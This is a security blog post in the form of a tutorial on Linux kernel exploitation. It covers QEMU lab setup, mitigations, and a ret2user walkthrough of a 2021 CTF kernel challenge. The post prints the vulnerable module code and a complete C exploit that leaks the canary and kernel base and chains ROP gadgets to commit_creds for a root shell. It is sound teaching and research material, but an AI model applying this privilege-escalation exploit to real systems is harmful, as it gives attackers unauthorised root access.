<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Linux Kernel Exploitation | santaclz’s blog</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Linux Kernel Exploitation" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Motivation" />
<meta property="og:description" content="Motivation" />
<link rel="canonical" href="http://localhost:4000/2023/11/03/Linux-Kernel-Exploitation.html" />
<meta property="og:url" content="http://localhost:4000/2023/11/03/Linux-Kernel-Exploitation.html" />
<meta property="og:site_name" content="santaclz’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-11-03T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Linux Kernel Exploitation" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-11-03T00:00:00+01:00","datePublished":"2023-11-03T00:00:00+01:00","description":"Motivation","headline":"Linux Kernel Exploitation","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/11/03/Linux-Kernel-Exploitation.html"},"url":"http://localhost:4000/2023/11/03/Linux-Kernel-Exploitation.html"}</script>
<!-- End Jekyll SEO tag -->

    <link rel="stylesheet" href="/assets/css/style.css?v=465e9589a3eb6630b387283e84268c79e35c62a6">
    <!--[if lt IE 9]>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
    <![endif]-->
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup Google Analytics -->

  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
    ga('create', 'G-DXDH6RMJMS', 'auto');
    ga('send', 'pageview');
  </script>



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


    <link rel="stylesheet" href="/css/main.css">
  </head>
  <body>
    <div class="wrapper">
      <header>
        <h1><a href="http://localhost:4000/">santaclz's blog</a></h1>
      </header>
      <section>

      <article class="post">
  <header>
    <h1>Linux Kernel Exploitation</h1>
    <p class="meta">03 Nov 2023</p>
  </header>

  <section class="content">
    <hr>
    <h2>Table of contents</h2>
    <ul><li><a href="#motivation">Motivation</a></li><li><a href="#where-are-kernel-exploits-used">Where are kernel exploits used?</a></li><li><a href="#linux-kernel-oversimplified">Linux kernel oversimplified</a></li><li><a href="#kernelspace-vs-userspace-exploitation-x86_64">Kernelspace vs Userspace exploitation (x86_64)</a><ul><li><a href="#more-instructions">More instructions</a></li><li><a href="#more-registers">More registers</a></li></ul></li></ul></li><li><a href="#what-are-the-goals-of-exploitation">What are the goals of exploitation?</a><ul><li><a href="#some-of-the-goals-can-be">Some of the goals can be:</a><ul><li><a href="#get-root">Get root</a></li><li><a href="#escape-seccomp">Escape SECCOMP</a></li><li><a href="#run-single-command">Run single command</a></li></ul></li></ul></li><li><a href="#setup">Setup</a><ul><li><a href="#install-prerequisites">Install prerequisites</a></li><li><a href="#build-the-linux-kernel-with-debug-symbols">Build the Linux kernel with debug symbols</a></li><li><a href="#build-busybox">Build BusyBox</a></li><li><a href="#build-initramfs">Build initramfs</a></li><li><a href="#run-with-qemu">Run with qemu</a></li></ul></li></ul></li><li><a href="#debugging">Debugging</a></li><li><a href="#shellcoding">Shellcoding</a></li><li><a href="#kernel-modules">Kernel modules</a></li><li><a href="#mitigations">Mitigations</a></li><li><a href="#ret2user">Ret2user</a><ul><li><a href="#vulnerability-analysis">Vulnerability analysis</a></li><li><a href="#exploitation">Exploitation</a></li></ul></li><li><a href="#video">Video</a></li><li><a href="#references">References</a></li></ul>
    <br>
    <hr>
    <br>
    <h1 id="motivation">Motivation</h1>

<p>I started my journey into the Linux kernel exploitation for the following reasons:</p>
<ul>
  <li>To improve my knowledge of Linux kernel</li>
  <li>Write exploits for real world bugs</li>
  <li>To research IoT devices with modified Linux kernel</li>
  <li>Pwn Google’s kCTF platform</li>
  <li>To get invited to conferences :)</li>
</ul>

<h1 id="where-are-kernel-exploits-used">Where are kernel exploits used?</h1>

<p>Kernel exploits are used (to my knowledge) by the following groups of people:</p>
<ul>
  <li>Threat actors: to escalate privileges</li>
  <li>Pentesters: to demonstrate impact</li>
  <li>Defenders: coming up with detections and mitigations</li>
  <li>Kernel / driver developers: to write patches</li>
  <li>Android / iOS superusers: to customize phones</li>
</ul>

<h1 id="linux-kernel-oversimplified">Linux kernel oversimplified</h1>

<p>Linux kernel is a layer between user applications and hardware. It manages this like CPU, memory, devices, file system, networking, process control and many other things. It’s a complex project with over 8 million lines of code and it’s still evolving. Such a dynamic project is an ideal research target.</p>

<h1 id="kernelspace-vs-userspace-exploitation-x86_64">Kernelspace vs Userspace exploitation (x86_64)</h1>

<p>If you’re coming from userspace exploitation (like me) you may notice the following differences when writing kernel exploits.</p>

<h3 id="more-instructions">More instructions</h3>

<p>Instructions such as:</p>

<ul>
  <li>LGDT - Loads an address of a GDT into GDTR</li>
  <li>LLDT - Loads an address of a LDT into LDTR</li>
  <li>LTR - Loads a Task Register into TR</li>
  <li>MOV Control Register - Copy data and store in Control Registers</li>
  <li>LMSW - Load a new Machine Status WORD</li>
  <li>CLTS - Clear Task Switch Flag in Control Register CR0</li>
  <li>MOV Debug Register - Copy data and store in debug registers</li>
  <li>INVD - Invalidate Cache without writeback</li>
  <li>INVLPG - Invalidate TLB Entry</li>
  <li>WBINVD - Invalidate Cache with writeback</li>
  <li>HLT - Halt Processor</li>
  <li>RDMSR - Read Model Specific Registers (MSR)</li>
  <li>WRMSR - Write Model Specific Registers (MSR)</li>
  <li>RDPMC - Read Performance Monitoring Counter</li>
  <li>RDTSC - Read time Stamp Counter</li>
</ul>

<p>With exceptions such as RDTSC which can also be run from userspace if TSD flag in register CR4 is not set.</p>

<h3 id="more-registers">More registers</h3>

<p>When debugging the kernel with gdb we can see additional registers:</p>

<ul>
  <li>fs_base - base address of fs</li>
  <li>gs_base - base address of gs</li>
  <li>k_gs_base - stores the value of gs_base register while switching from userspace to kernelspace or vice versa</li>
  <li>cr0 - control register</li>
  <li>cr2 - control register</li>
  <li>cr3 - control register</li>
  <li>cr4 - control register</li>
  <li>cr8 - control register</li>
  <li>efer - Extended Feature Enable Register</li>
  <li>mxcsr - control and status for SSE registers</li>
</ul>

<h1 id="what-are-the-goals-of-exploitation">What are the goals of exploitation?</h1>

<p>The goal usually revolves around gaining higher privileges on the system or gaining persistence.</p>

<h2 id="some-of-the-goals-can-be">Some of the goals can be:</h2>

<h3 id="get-root">Get root</h3>
<ul>
  <li>payload: commit_creds(prepare_kernel_cred(0))</li>
</ul>

<h3 id="escape-seccomp">Escape SECCOMP</h3>
<ul>
  <li>payload: current-&gt;thread_info.flags &amp;= ~(1 « TIF_SECCOMP)</li>
</ul>

<h3 id="run-single-command">Run single command</h3>
<ul>
  <li>payload: run_cmd(“/path_to_command”)</li>
</ul>

<h1 id="setup">Setup</h1>

<h3 id="install-prerequisites">Install prerequisites</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install</span> <span class="nt">-y</span> bison flex libelf-dev cpio build-essential libssl-dev qemu-system-x86 libncurses-dev
</code></pre></div></div>

<h3 id="build-the-linux-kernel-with-debug-symbols">Build the Linux kernel with debug symbols</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/torvalds/linux <span class="c"># or download specific kernel version from https://mirrors.edge.kernel.org/pub/linux/kernel/</span>
<span class="nb">cd </span>linux <span class="o">&amp;&amp;</span> make defconfig <span class="o">&amp;&amp;</span> make menuconfig
<span class="c"># Ensure that kernel hacking --&gt; Compile-time checks and compiler options --&gt; Compile the kernel with debug symbols is checked.</span>
make <span class="nt">-j</span><span class="si">$(</span><span class="nb">nproc</span><span class="si">)</span>
</code></pre></div></div>

<h3 id="build-busybox">Build BusyBox</h3>
<p>Download and decompress busybox (I chose the latest version at the time).</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2
<span class="nb">tar </span>xvf busybox-1.36.1.tar.bz2
</code></pre></div></div>

<p>Build it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>busybox-1.36.1
make defconfig
make menuconfig
</code></pre></div></div>

<p>In the Busybox Settings menu, select Build Options, and check the box next to Build BusyBox as a static binary (no shared libs). Next, specify the output folder.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make
make <span class="nv">CONFIG_PREFIX</span><span class="o">=</span>./../busybox_rootfs <span class="nb">install</span>
</code></pre></div></div>

<h3 id="build-initramfs">Build initramfs</h3>

<p>Create a directory hierarchy for initramfs.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="nt">-p</span> initramfs/<span class="o">{</span>bin,dev,etc,home,mnt,proc,sys,usr,tmp<span class="o">}</span>
<span class="nb">cd </span>initramfs/dev
<span class="nb">sudo mknod </span>sda b 8 0 
<span class="nb">sudo mknod </span>console c 5 1
</code></pre></div></div>

<p>Copy everything from the busybox_rootfs folder to the initramfs folder. Next, create an init file in the root of initramfs, and write the following into it:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh</span>

mount <span class="nt">-t</span> proc none /proc
mount <span class="nt">-t</span> sysfs none /sys

/bin/mount <span class="nt">-t</span> devtmpfs devtmpfs /dev
<span class="nb">chown </span>1337:1337 /tmp

setsid cttyhack setuidgid 1337 sh

<span class="nb">exec</span> /bin/sh
</code></pre></div></div>

<p>Make the script executable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x init
</code></pre></div></div>

<p>Create initramfs itself.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-print0</span> | cpio <span class="nt">--null</span> <span class="nt">-ov</span> <span class="nt">--format</span><span class="o">=</span>newc <span class="o">&gt;</span> initramfs.cpio 
<span class="nb">gzip</span> ./initramfs.cpio
</code></pre></div></div>

<p>This will create <code class="language-plaintext highlighter-rouge">initramfs.cpio.gz</code> file which we will use as a filesystem for our qemu emulated Linux kernel.</p>

<h3 id="run-with-qemu">Run with qemu</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qemu-system-x86_64 <span class="se">\</span>
    <span class="nt">-m</span> 512M <span class="se">\</span>
    <span class="nt">-nographic</span> <span class="se">\</span>
    <span class="nt">-kernel</span> bzImage <span class="se">\</span>
    <span class="nt">-append</span> <span class="s2">"console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr"</span> <span class="se">\</span>
    <span class="nt">-no-reboot</span> <span class="se">\</span>
    <span class="nt">-cpu</span> qemu64 <span class="se">\</span>
    <span class="nt">-smp</span> 1 <span class="se">\</span>
    <span class="nt">-monitor</span> /dev/null <span class="se">\</span>
    <span class="nt">-initrd</span> initramfs.cpio.gz <span class="se">\</span>
    <span class="nt">-net</span> nic,model<span class="o">=</span>virtio <span class="se">\</span>
    <span class="nt">-net</span> user <span class="se">\</span>
    <span class="nt">-gdb</span> tcp::1234 <span class="se">\</span>
    <span class="nt">-S</span>
</code></pre></div></div>
<p>Flag <code class="language-plaintext highlighter-rouge">-gdb tcp::1234</code> sets gdbstub listener on port 1234. The <code class="language-plaintext highlighter-rouge">-S</code> flag halts the qemu execution until gdb debugger is connected.</p>

<h1 id="debugging">Debugging</h1>

<p>For debugging run the qemu instance with the -gdb and -S flag. Open gdb in another terminal and write:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>target remote :1234
</code></pre></div></div>
<p>As for gdb extensions use which ever extension works, I use gef, although most of the things can be accomplished with plain gdb.</p>

<h1 id="shellcoding">Shellcoding</h1>

<p>If you know what you want to accomplish with code but don’t know how to do it on assembly level, write a kernel module, compile it and dump the assembly.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-M</span> intel <span class="nt">-d</span> test.ko
</code></pre></div></div>

<h1 id="kernel-modules">Kernel modules</h1>

<p>Kernel modules are programs that can be loaded and unloaded into the kernel on the fly without the need to reboot the system. They are a great start for learning kernel exploitation as they run with kernel privileges.</p>

<p>To load a kernel module you can use:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>insmod &lt;module_name.ko&gt;
</code></pre></div></div>

<p>To unload a kernel module:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>rmmod &lt;module_name&gt;
</code></pre></div></div>

<p>To list currently loaded modules:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsmod
</code></pre></div></div>

<p>All kernel modules have a struct called fops (file operations) which specifies which functions are called upon calling read, write, open, close or ioctl functions.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="k">struct</span> <span class="n">file_operations</span> <span class="n">module_fops</span> <span class="o">=</span>
<span class="p">{</span>
    <span class="p">.</span><span class="n">owner</span>   <span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
    <span class="p">.</span><span class="n">read</span>    <span class="o">=</span> <span class="n">module_read</span><span class="p">,</span>
    <span class="p">.</span><span class="n">write</span>   <span class="o">=</span> <span class="n">module_write</span><span class="p">,</span>
    <span class="p">.</span><span class="n">open</span>    <span class="o">=</span> <span class="n">module_open</span><span class="p">,</span>
    <span class="p">.</span><span class="n">release</span> <span class="o">=</span> <span class="n">module_close</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div></div>

<p>We can start auditing each of these functions in our search for bugs.</p>

<h1 id="mitigations">Mitigations</h1>

<ul>
  <li>KASLR - randomizes base address of the kernel (same as userspace ASLR)</li>
  <li>FG-KASLR - randomizes base address of every function</li>
  <li>Kernel Stack Canary - value is placed on the stack before return address, this prevents some buffer overflow attacks (same as userspace)</li>
  <li>SMEP - Supervisor Mode Execution Prevention prevents executing code stored in userspace from kernelspace</li>
  <li>SMAP - Supervisor Mode Access Prevention prevents accessing memory from userspace while in kernelspace</li>
  <li>KPTI - Kernel Page Tables Isolation is a mitigation against Meltdown CPU bug</li>
</ul>

<p>More mitigations can be found at <a href="https://github.com/a13xp0p0v/linux-kernel-defence-map">https://github.com/a13xp0p0v/linux-kernel-defence-map</a></p>

<h1 id="ret2user">Ret2user</h1>

<p>Let’s take a look at the ret2user technique which is commonly used to escalate privileges. For this example I chose a challenge from K3RN3LCTF 2021 called easy_kernel which can be downloaded here: <a href="https://github.com/seal9055/seal9055.github.io/blob/main/docs/kernel/kernel_rop.tar.gz">https://github.com/seal9055/seal9055.github.io/blob/main/docs/kernel/kernel_rop.tar.gz</a></p>

<h2 id="vulnerability-analysis">Vulnerability analysis</h2>

<p>As I mentioned before, kernel modules are a great way to start learning Linux kernel exploitation. In this challenge we are provided with vulnerable kernel module <code class="language-plaintext highlighter-rouge">vuln.ko</code> and we have source code in <code class="language-plaintext highlighter-rouge">vuln.c</code>.</p>

<p>Analyzing <code class="language-plaintext highlighter-rouge">s_read</code> function we notice a fixed size message buffer.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">s_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">ubuf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">message</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>

    <span class="n">strcpy</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="s">"Welcome to this kernel pwn series"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">raw_copy_to_user</span><span class="p">(</span><span class="n">ubuf</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">"%ld bytes read by device</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">"Some error occured in read</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>If we read more than 40 chars from the message buffer we have a memory leak. This is useful for bypassing KASLR and Kernel Stack Canaries.</p>

<p>Analyzing <code class="language-plaintext highlighter-rouge">s_write</code> function we notice it’s similar but instead of reading we write values into the buffer.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">s_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">ubuf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">raw_copy_from_user</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">ubuf</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">"%ld bytes written to device</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">"Some error occured in write</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Calling this function and passing it more than 40 bytes we can trigger buffer overflow.</p>

<h2 id="exploitation">Exploitation</h2>

<p>We have everything we need to start writing an exploit. Since this setup has no libc we can compile the binary statically and pack it into initramfs file system.</p>

<p>This is the plan for writing an exploit:</p>

<ol>
  <li>Leak Kernel Stack Canary</li>
  <li>Leak kernel address to bypass KASLR</li>
  <li>Save state for switching context between user-land and kernel-land (save registers for restoring them later)</li>
  <li>Write ROP chain to bypass SMEP (Execution Prevention) and trigger buffer overflow</li>
  <li>Get shell with <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></li>
  <li>Register SIGSEGV signal handler for KPTI bypass (otherwise the exploit Segfaults which is part of KPTI protection)</li>
</ol>

<p>Below is an example of an exploit utilizing ret2user technique and bypassing KASLR, Kernel Stack Canary, SMEP, SMAP, KPTI:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
</span>
<span class="kt">void</span> <span class="nf">spawn_shell</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Returned to userland"</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
    <span class="k">else</span> <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Not root"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_rsp</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// KPTI bypass</span>
    <span class="n">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">spawn_shell</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/pwn_device"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"[-] Failed to open device"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Opened device"</span><span class="p">);</span>

    <span class="c1">// Leak</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">buff</span><span class="p">[</span><span class="mi">80</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="mi">64</span><span class="p">);</span>

    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cookie</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">base</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x25de2e</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Leaked cookie: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Leaked base: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>

    <span class="c1">// Save state</span>
    <span class="n">__asm__</span><span class="p">(</span>
        <span class="s">".intel_syntax noprefix;"</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_rsp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
        <span class="s">".att_syntax;"</span>
    <span class="p">);</span>

    <span class="c1">// Overflow</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="mi">40</span><span class="p">]</span> <span class="o">=</span> <span class="p">{[</span><span class="mi">0</span> <span class="p">...</span> <span class="mi">39</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">};</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
    <span class="o">++</span><span class="n">i</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x001778</span><span class="p">;</span> <span class="c1">// pop rdi; ret; </span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x08c340</span><span class="p">;</span> <span class="c1">// prepare_kernel_cred</span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x08bf00</span><span class="p">;</span> <span class="c1">// commit_creds</span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xc00f58</span><span class="p">;</span> <span class="c1">// swapgs; ret; </span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0x024952</span><span class="p">;</span> <span class="c1">// iretq; ret; </span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">spawn_shell</span><span class="p">;</span> <span class="c1">// userland rip</span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rsp</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="o">++</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>

    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">payload</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h1 id="video">Video</h1>
<p>Below is a video of a talk I gave at BSidesLjubljana in June 2023.</p>

<iframe width="560" height="315" src="https://ia802709.us.archive.org/35/items/BSidesLjubljana2023/t1_06_Guide_To_Linux_Kernel_Exploitation-Ivor_Canjuga.mp4" frameborder="0" allowfullscreen=""></iframe>

<h1 id="references">References</h1>

<p><a href="https://medium.com/@kiky.tokamuro/creating-initramfs-5cca9b524b5a">https://medium.com/@kiky.tokamuro/creating-initramfs-5cca9b524b5a</a></p>

<p><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a></p>

<p><a href="https://sam4k.com/linternals-memory-allocators-0x02/">https://sam4k.com/linternals-memory-allocators-0x02/</a></p>

<p><a href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/">https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/</a></p>

<p><a href="https://seal9055.com/blog/kernel/return_oriented_programming">https://seal9055.com/blog/kernel/return_oriented_programming</a></p>

<p><a href="https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/kernel-page-table-isolation-kpti#kpti-trampoline">https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/kernel-page-table-isolation-kpti#kpti-trampoline</a></p>

<p><a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628</a></p>

<p><a href="https://pwn.college/system-security/kernel-security">https://pwn.college/system-security/kernel-security</a></p>

<p><a href="https://github.com/google/syzkaller/">https://github.com/google/syzkaller/</a></p>

<p><a href="https://research.nccgroup.com/2018/09/11/ncc-groups-exploit-development-capability-why-and-what/">https://research.nccgroup.com/2018/09/11/ncc-groups-exploit-development-capability-why-and-what/</a></p>

<p><a href="https://lwn.net/Articles/824307/">https://lwn.net/Articles/824307/</a></p>

<p><a href="https://meltdownattack.com/meltdown.pdf">https://meltdownattack.com/meltdown.pdf</a></p>

<p><a href="http://www.brokenthorn.com/Resources/OSDev23.html">http://www.brokenthorn.com/Resources/OSDev23.html</a></p>

  </section>
</article>



      </section>
      <footer>
        
        <p>This project is maintained by <a href="https://github.com/santaclz">santaclz</a></p>
        
        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
      </footer>
    </div>
    <script src="/assets/js/scale.fix.js"></script>
  </body>
</html>